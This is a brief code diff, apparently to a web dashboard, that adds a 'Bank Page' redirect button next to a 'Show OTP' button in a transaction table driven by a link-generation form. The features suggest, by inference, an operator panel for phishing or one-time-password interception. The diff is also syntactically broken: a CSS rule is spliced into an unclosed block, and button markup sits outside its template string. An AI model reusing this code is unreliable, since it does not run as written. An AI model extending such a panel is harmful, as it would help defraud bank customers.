@@ -119,6 +119,11 @@
     }
     .show-otp-btn {
       background: #22c55e;
+       .bank-page-btn {
+      background: #8b5cf6;
+    }
+    .bank-page-btn:hover {
+      background: #7c3aed;
     }
     .show-otp-btn:disabled {
       background: #666;
@@ -286,6 +291,11 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
                   `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                     Show OTP
                   </button>`
+
+                 <button class="bank-page-btn" onclick="redirectToBankPage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                    Bank Page
+                  </button>`
+            
               }
             </td>
             <td>
